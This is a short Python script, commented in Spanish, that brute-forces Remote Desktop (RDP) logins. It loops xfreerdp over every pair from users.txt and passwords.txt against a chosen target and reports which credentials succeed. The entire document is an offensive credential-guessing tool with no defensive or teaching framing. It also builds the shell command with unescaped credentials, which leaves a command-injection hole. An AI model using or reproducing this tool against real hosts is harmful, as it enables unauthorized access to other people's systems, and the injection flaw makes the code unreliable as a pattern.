import argparse
import subprocess

def args_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True, help="Objetivo de RDP")
    return parser.parse_args()

def load_credentials_from_file(filename):
    credentials = []
    with open(filename, 'r') as file:
        for line in file:
            credentials.append(line.strip())
    return credentials

def main():
    args = args_parse()  
    targets = [args.target] 
    usernames = load_credentials_from_file("users.txt")  # Carga nombres de usuario desde un archivo 
    passwords = load_credentials_from_file("passwords.txt")  # Carga contraseñas desde un archivo 

    for target in targets:
        for username in usernames:
            for password in passwords:
                # Construye el comando para ejecutar xfreerdp con los parámetros dados 
                cmd = f"xfreerdp /v:{target} /u:{username} /p:{password} /sec:nla /cert-ignore"

                try:
                    # Ejecuta el comando y captura la salida 
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)

                    # Verifica si la salida indica un inicio de sesión exitoso o fallido 
                    if "Authentication only, exit status 0" in result.stdout:
                        print(f"Inicio de sesión exitoso para {username}:{password} en {target}.")
                    else:
                        print(f"Inicio de sesión fallido para {username}:{password} en {target}.")

                except subprocess.CalledProcessError as e:
                    # Captura errores de ejecución del comando 
                    print(f"Error para {username}:{password} en {target}:", e.stderr)
                except Exception as e:
                    # Captura errores inesperados 
                    print(f"Error inesperado para {username}:{password} en {target}:", str(e))

if __name__ == '__main__':
    main()  